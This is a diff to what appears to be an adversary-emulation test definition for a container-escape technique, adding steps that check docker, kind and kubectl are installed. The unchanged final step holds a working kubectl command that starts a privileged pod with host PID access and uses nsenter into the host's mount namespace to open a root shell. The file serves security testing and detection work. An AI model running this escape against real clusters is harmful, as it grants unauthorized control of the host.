@@ -16,6 +16,26 @@ requirements:
     platforms:
         - os: containers
 steps:
+    - name: Verify docker is installed.
+      inline: |
+        which docker
+      executor: sh
+    - name: Verify docker service is running.
+      inline: |
+        sudo systemctl status docker
+      executor: sh
+    - name: Verify kind is in the path.
+      inline: |
+        which kind
+      executor: sh
+    - name: Verify kind-atomic-cluster is created
+      inline: |
+        sudo kind get clusters
+      executor: sh
+    - name: Verify kubectl is in path
+      inline: |
+        which kubectl
+      executor: sh
     - name: deploy-container-using-nsenter-container-escape
       inline: |
         kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
